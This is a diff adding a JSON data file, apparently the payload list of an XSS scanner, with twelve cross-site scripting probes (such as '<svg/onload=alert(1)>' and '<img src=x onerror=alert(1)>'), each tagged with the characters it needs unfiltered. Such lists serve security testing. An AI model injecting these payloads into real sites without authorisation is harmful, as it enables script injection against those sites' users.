@@ -1,0 +1,118 @@
+[
+    {
+        "Payload": "\" onmouseover=alert(1)>",
+        "Attribute": [
+            "\""
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "\"><script>alert(1)</script>",
+        "Attribute": [
+            "<",
+            ">",
+            "/",
+            "'",
+            "\""
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "<svg/onload=alert(1)>",
+        "Attribute": [
+            "<",
+            ">",
+            "/"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "<img src=x onerror=alert(1)>",
+        "Attribute": [
+            ">",
+            "<"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "<image/src/onerror=prompt(8)>",
+        "Attribute": [
+            ">",
+            "<",
+            "/"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "<img src=x onerror=alert(1);> ",
+        "Attribute": [
+            "<",
+            ">",
+            ";",
+            "/"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "Attribute": [
+            "\"",
+            "<",
+            ">",
+            "/",
+            "'"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "\"><svg onload=alert(1)//",
+        "Attribute": [
+            "\"",
+            ">",
+            "<",
+            "'"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "<x contenteditable onblur=alert(1)>lose focus! ",
+        "Attribute": [
+            "\"",
+            "<",
+            ">"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "<x onclick=alert(1)>click this! ",
+        "Attribute": [
+            "\"",
+            "'",
+            ">",
+            "<",
+            "/"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "<x onmouseover=alert(1)>hover this!",
+        "Attribute": [
+            "\"",
+            "'",
+            ">",
+            "<"
+        ],
+        "count": 0
+    },
+    {
+        "Payload": "\"><img src=1 onerror=alert(1)>.gif",
+        "Attribute": [
+            "\"",
+            ">",
+            "<",
+            ";",
+            "/"
+        ],
+        "count": 0
+    }
+]
